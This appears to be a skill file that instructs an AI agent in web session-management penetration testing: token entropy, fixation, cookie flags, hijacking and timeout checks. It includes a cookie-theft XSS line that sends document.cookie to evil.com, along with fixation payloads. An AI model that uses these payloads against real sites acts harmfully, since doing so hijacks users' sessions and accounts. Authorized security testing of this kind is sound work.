# Session Management Attacks Skill

## Goal

Identify and exploit session management vulnerabilities to hijack user sessions or maintain unauthorized access.

## Methodology

1. **Analyze Session Tokens:** Check randomness, length, and predictability
2. **Test Session Fixation:** Check if pre-login tokens persist post-login
3. **Test Session Invalidation:** Verify logout and timeout behavior
4. **Check Cookie Security:** Examine secure, httpOnly, sameSite flags
5. **Exploit Weaknesses:** Hijack sessions or bypass authentication

## Session Token Analysis

```bash
# Check token entropy
# Collect multiple tokens and analyze:
- Length (should be 128+ bits)
- Character set
- Randomness (no patterns)
- Time-based components
```

## Session Fixation

```bash
# Attack flow:
1. Attacker gets valid session ID: SESS=abc123
2. Trick victim to use: https://target.com/?SESS=abc123
3. Victim authenticates
4. Session abc123 now has victim's privileges
5. Attacker uses abc123 to access victim's account
```

### Fixation via Cookie
```html
<script>document.cookie='SESSIONID=attacker_session; domain=.target.com'</script>
```

### Fixation via URL
```html
<a href="https://target.com/login?PHPSESSID=fixed_session">Login Here</a>
```

## Cookie Security Flags

```http
# Secure cookie settings
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict; Path=/

# Vulnerabilities to check:
- Missing Secure flag (sent over HTTP)
- Missing HttpOnly (accessible to JavaScript/XSS)
- SameSite=None (vulnerable to CSRF)
- Overly broad Domain/Path
```

## Session Hijacking

```javascript
// Steal via XSS (if HttpOnly not set)
new Image().src='https://evil.com/?cookie='+document.cookie;

// Steal via network (if Secure not set)
// MITM attack captures cookie over HTTP
```

## Session Timeout Testing

```bash
# Test various timeout scenarios:
1. Leave session idle, check if auto-expires
2. After logout, try reusing old session token
3. Change password, check if other sessions invalidated
4. Concurrent login limits
```

## Session Puzzling

```bash
# Same session variable used for different purposes
1. Create session variable via forgot-password
2. Access admin functionality that checks same variable
```

## Token in URL Leakage

```bash
# If session in URL:
https://target.com/dashboard?session=xyz

# Token leaks via:
- Referer header to external sites
- Browser history
- Web logs
- Bookmarks
```

## Tools

* **Burp Suite Sequencer** - Analyze token randomness
* **Cookie Editor** - Browser extension for cookie manipulation
* **Browser DevTools** - Inspect cookie flags

## Example Analysis

```bash
# Using Burp Sequencer:
1. Capture session token request
2. Send to Sequencer
3. Start live capture (collect 100+ tokens)
4. Analyze randomness (should show high entropy)
```

## Guidance for AI

* Activate when testing authentication and session handling
* First check cookie security flags (Secure, HttpOnly, SameSite)
* Test if session changes after login (prevents fixation)
* Verify logout actually invalidates session server-side
* Check for session token in URL (anti-pattern)
* Test concurrent session limits if applicable
* Long session timeouts increase hijacking window
